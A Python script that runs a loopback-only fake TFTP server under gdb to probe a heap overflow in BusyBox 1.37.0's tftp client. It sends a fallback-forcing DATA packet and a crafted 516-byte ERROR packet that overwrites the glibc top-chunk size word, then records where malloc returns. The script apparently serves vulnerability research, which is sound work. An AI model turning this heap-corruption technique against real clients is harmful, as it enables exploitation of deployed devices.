#!/usr/bin/env python3
"""Loopback-only probe: where does vasprintf's malloc() return when the
top-chunk size word has been overwritten with a value that passes glibc's
`size > av->system_mem` corruption guard?

Uses the stock plain BusyBox 1.37.0 client and the real TFTP UDP path.
No code is injected into the client; gdb only observes. The server sends the
fallback-forcing DATA block 0 and a 516-byte ERROR whose bytes at rbuf+72..79
set the top-chunk size word.
"""
import os
import socket
import struct
import subprocess
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
BINARY = os.path.abspath(sys.argv[1]) if len(sys.argv) > 1 else os.path.join(HERE, "busybox-plain")
TOP_SIZE = int(sys.argv[2], 0) if len(sys.argv) > 2 else 0x20000

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.bind(("127.0.0.1", 0))
sock.settimeout(3)
port = sock.getsockname()[1]

cmd = [BINARY, "tftp", "-g", "-b", "64",
       "-l", os.path.join(HERE, "malloc-probe-out.bin"),
       "-r", "MISHE", "127.0.0.1", str(port)]

gdb_cmds = os.path.join(HERE, "malloc_probe.gdb")
with open(gdb_cmds, "w") as f:
    f.write(
        "set disable-randomization off\n"
        "set pagination off\nset confirm off\nset print elements 0\n"
        "break tftp.c:604\n"
        "run\n"
        "set $r = rbuf\n"
        "printf \"FIRST RBUF=%p XBUF=%p NEXT=%#lx\\n\", $r, xbuf, *(unsigned long*)($r+72)\n"
        "continue\n"
        "printf \"SECOND IO_BUFSIZE=%d LEN=%d NEXT=%#lx\\n\", io_bufsize, len, *(unsigned long*)($r+72)\n"
        "break malloc\n"
        "continue\n"
        "printf \"MALLOC_CALLED size=%#lx\\n\", $rdi\n"
        "finish\n"
        "printf \"MALLOC_RET=%p RBUF=%p DELTA=%ld\\n\", $1, $r, (long)((char*)$1-(char*)$r)\n"
        "x/6gx (char*)$1-16\n"
        "bt 8\n"
        "quit\n"
    )

proc = subprocess.Popen(
    ["gdb", "-q", "-batch", "-x", gdb_cmds, "--args"] + cmd,
    stdout=subprocess.PIPE, stderr=subprocess.STDOUT, cwd=HERE)

req, peer = sock.recvfrom(2048)
print("REQ", repr(req))
sock.sendto(struct.pack("!HH", 3, 0), peer)   # non-OACK block 0 -> fallback
time.sleep(0.15)
msg = bytearray(b"A" * 512)
msg[68:76] = struct.pack("<Q", TOP_SIZE)      # rbuf+72..79: top size word
pkt = struct.pack("!HH", 5, 0) + bytes(msg)
assert len(pkt) == 516
sock.sendto(pkt, peer)
try:
    while True:
        sock.recvfrom(2048)
except socket.timeout:
    pass

out, err = proc.communicate(timeout=60)
text = (out + (err or b"")).decode("utf-8", "replace")
print("TOP_SIZE", hex(TOP_SIZE), "RC", proc.returncode)
for line in text.splitlines():
    print("GDB", line[:300])
sock.close()
